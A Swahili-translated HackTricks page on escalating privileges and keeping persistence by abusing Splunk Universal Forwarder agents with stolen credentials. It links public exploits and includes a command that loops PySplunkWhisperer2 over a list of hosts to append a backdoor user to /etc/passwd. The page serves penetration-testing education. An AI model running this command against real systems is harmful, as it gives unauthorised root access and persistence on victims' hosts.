# Splunk LPE and Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Ikiwa **unapohesabu** mashine **ndani** au **nje** unakuta **Splunk inafanya kazi** (port 8090), ikiwa kwa bahati unajua **akili halali** unaweza **kutumia huduma ya Splunk** ili **kutekeleza shell** kama mtumiaji anayekimbia Splunk. Ikiwa root inafanya kazi, unaweza kuongeza mamlaka hadi root.

Pia ikiwa wewe ni **root tayari na huduma ya Splunk haisikii tu kwenye localhost**, unaweza **kuiba** faili ya **nenosiri** **kutoka** kwa huduma ya Splunk na **kuvunja** nenosiri, au **kuongeza** akili mpya kwake. Na kudumisha uvumilivu kwenye mwenyeji.

Katika picha ya kwanza hapa chini unaweza kuona jinsi ukurasa wa Splunkd unavyoonekana.



## Muhtasari wa Ulaghai wa Splunk Universal Forwarder Agent

Kwa maelezo zaidi angalia chapisho [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Hii ni muhtasari tu:

**Muhtasari wa Ulaghai:**
Ulaghai unaolenga Splunk Universal Forwarder Agent (UF) unaruhusu washambuliaji wenye nenosiri la wakala kutekeleza msimbo wa kiholela kwenye mifumo inayokimbia wakala, ambayo inaweza kuhatarisha mtandao mzima.

**Mambo Muhimu:**
- Wakala wa UF hauhakiki muunganisho unaokuja au uhalali wa msimbo, hivyo unakuwa hatarini kwa utekelezaji wa msimbo usioidhinishwa.
- Njia za kawaida za kupata nenosiri ni pamoja na kuzitafuta katika saraka za mtandao, kushiriki faili, au nyaraka za ndani.
- Ulaghai uliofanikiwa unaweza kusababisha ufikiaji wa kiwango cha SYSTEM au root kwenye mwenyeji walioathirika, uhamasishaji wa data, na kuingia zaidi kwenye mtandao.

**Utekelezaji wa Ulaghai:**
1. Mshambuliaji anapata nenosiri la wakala wa UF.
2. Anatumia API ya Splunk kutuma amri au skripti kwa wakala.
3. Vitendo vinavyowezekana ni pamoja na uchimbaji wa faili, usimamizi wa akaunti za watumiaji, na kuathiri mfumo.

**Athari:**
- Kuathiri mtandao mzima kwa ruhusa za kiwango cha SYSTEM/root kwenye kila mwenyeji.
- Uwezekano wa kuzima uandishi wa kumbukumbu ili kuepuka kugundulika.
- Usanidi wa milango ya nyuma au ransomware.

**Amri ya Mfano kwa Ulaghai:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Matukio ya umma yanayoweza kutumika:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Kutumia Maswali ya Splunk

**Kwa maelezo zaidi angalia chapisho [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
